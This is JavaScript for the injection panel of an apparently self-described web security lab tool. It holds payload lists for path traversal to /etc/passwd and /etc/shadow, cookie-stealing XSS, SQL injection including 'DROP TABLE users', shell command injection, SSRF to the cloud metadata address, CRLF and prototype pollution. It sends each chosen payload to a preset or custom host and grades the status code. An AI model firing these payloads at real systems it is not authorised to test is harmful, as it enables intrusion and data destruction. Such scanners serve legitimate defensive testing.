var injPayloads = {
    path: ['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/../../etc/hosts','/../etc/shadow','/....//....//etc/passwd','/../proc/self/environ','/%252e%252e/etc/passwd','/..%2F..%2Fetc%2Fpasswd'],
    xss:  ['/?q=<img src=x onerror=alert(1)>','/?q="><svg onload=alert(1)>','/?q=" onerror="alert(document.cookie)','/?q=javascript:alert(1)','/?q=<iframe src=javascript:alert(1)>','/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'],
    sql:  ["/?id=1' OR '1'='1","/?id=1; DROP TABLE users--","/?user=admin'--","/?id=1 UNION SELECT null,null--","/?id=1 AND SLEEP(5)--","/?q=' OR 1=1/*","/?id=0x27 OR 0x313d31"],
    cmd:  ['/?cmd=ls%20-la','/?file=;cat%20/etc/passwd','/?q=`id`','/?path=|whoami','/?name=$(id)','/?host=localhost;id'],
    ssrf: ['/?url=http://localhost','/?redirect=http://127.0.0.1:22','/?img=http://internal/admin','/?page=file:///etc/passwd','/?proxy=http://169.254.169.254/latest/meta-data'],
    hdr:  ['/?x=1\r\nX-Injected: pwned','/?x=1\nSet-Cookie: evil=1; Path=/','/?accept='+new Array(400).join('text/html,')],
    crlf: ['/\r\nX-Custom: injected','/%0d%0aX-Injected: header','/%0aSet-Cookie: crlf=1','/search?q=%0d%0aInjected%3A+Header'],
    uri:  ['/'+new Array(4097).join('A'),'/?'+new Array(2000).join('key=val&'),'/'+new Array(9000).join('x')],
    null: ['/index.html%00.php','/%00','/test%00.php','/admin%00','/?id=1%00'],
    proto:['/?__proto__[admin]=true','/?constructor[prototype][admin]=1','/?__proto__[isAdmin]=1'],
    enc:  ['/%c0%ae%c0%ae/etc/passwd','/%u002e%u002e/etc/passwd','/%2e%2e%2f%2e%2e%2fetc%2fpasswd','/%e0%80%ae%e0%80%ae/etc/passwd'],
    ovr:  ['/'+new Array(65537).join('X'),'/?'+new Array(8001).join('a=')]
};
var currentCat = 'path', injHist = [];

function injPresetChange(){
    var sel = document.getElementById('inj-preset');
    var inp = document.getElementById('inj-host');
    inp.style.display = sel.value === 'custom' ? 'block' : 'none';
    if(sel.value !== 'custom') inp.value = sel.value;
}
function selCat(el){
    document.querySelectorAll('.cat-chip').forEach(function(c){ c.classList.remove('sel'); });
    el.classList.add('sel'); currentCat = el.dataset.cat; buildInj();
}
function buildInj(){
    var sel = document.getElementById('inj-pl'); sel.innerHTML = '';
    (injPayloads[currentCat]||[]).forEach(function(p){
        var o = document.createElement('option'); o.value = p;
        o.textContent = p.length > 60 ? p.slice(0,60)+'…' : p;
        sel.appendChild(o);
    });
    pickPayload();
}
function pickPayload(){
    var v = document.getElementById('inj-pl').value;
    if(v) document.getElementById('inj-custom').value = v;
}
function getInjHost(){
    var sel = document.getElementById('inj-preset');
    return sel.value === 'custom' ? document.getElementById('inj-host').value : sel.value;
}

function runInject(){
    var host    = getInjHost();
    var payload = document.getElementById('inj-custom').value || document.getElementById('inj-pl').value;
    var url     = host + payload;
    document.getElementById('inj-req').textContent =
        'GET '+payload+'\nHost: '+host.replace(/https?:\/\//,'')+'\nUser-Agent: PhenixGinx-Lab/1.0\nConnection: close';
    document.getElementById('inj-resp').textContent = 'Envoi…';
    document.getElementById('inj-verd').className = 'verdict';
    var t0 = Date.now();
    fetch(url, {method:'GET', mode:'cors', cache:'no-store'}).then(function(r){
        var lat = Date.now()-t0, code = r.status;
        return r.text().then(function(b){
            var cls = code<300?'c2':code<400?'c3':code<500?'c4':'c5';
            document.getElementById('inj-resp').innerHTML =
                '<span class="'+cls+'">HTTP '+code+' · '+lat+'ms</span>\n'+esc(b.slice(0,600));
            setVerdict(code, payload, lat);
            G.emit('inj', {method:'GET', path:payload, code:code, lat:lat});
        });
    }).catch(function(e){
        var lat = Date.now()-t0;
        document.getElementById('inj-resp').innerHTML =
            '<span class="c5">CORS / ERR ('+lat+'ms): '+esc(e.message)+'</span>';
        var vd = document.getElementById('inj-verd');
        vd.className = 'verdict vwarn';
        vd.textContent = '⚠ CORS bloqué — utilisez les URLs proxy pour tester sans CORS';
        addInjHist(payload, 0, lat, '⚠');
        G.emit('inj', {method:'GET', path:payload, code:0, lat:lat});
    });
}
function setVerdict(code, payload, lat){
    var vd = document.getElementById('inj-verd');
    var cls, msg;
    if([400,403,404,405,414,431,501].indexOf(code) >= 0){
        cls='vok';  msg='✅ Serveur protégé — payload rejeté avec '+code;
    } else if(code >= 500){
        cls='vbad'; msg='🔴 Danger — Erreur '+code+' : crash ou fuite d\'info potentielle !';
    } else if(code === 200){
        cls='vwarn'; msg='⚠ À vérifier — Le serveur a répondu 200 à ce payload';
    } else {
        cls='vwarn'; msg='⚠ Code '+code+' — analyser manuellement';
    }
    vd.className = 'verdict '+cls; vd.textContent = msg;
    addInjHist(payload, code, lat, cls==='vok'?'✅':cls==='vbad'?'🔴':'⚠');
    G.syncSplit();
}
function addInjHist(pl, code, lat, icon){
    injHist.unshift({pl:pl, code:code, lat:lat, icon:icon});
    if(injHist.length > 50) injHist.pop();
    var cls = {2:'c2',3:'c3',4:'c4',5:'c5'}; var html=''; var i=-1;
    while(++i < injHist.length){
        var h=injHist[i]; var c=cls[Math.floor(h.code/100)]||'c4';
        html += '<div class="hitem">'+
                '<span>'+h.icon+'</span>'+
                '<span class="'+c+'" style="width:36px;flex-shrink:0">'+h.code+'</span>'+
                '<span>'+h.pl.slice(0,45)+'</span>'+
                '<span style="margin-left:auto;color:var(--muted)">'+h.lat+'ms</span></div>';
    }
    document.getElementById('inj-hist').innerHTML = html;
    var sh = document.getElementById('sp-inj-hist'); if(sh) sh.innerHTML = html;
}
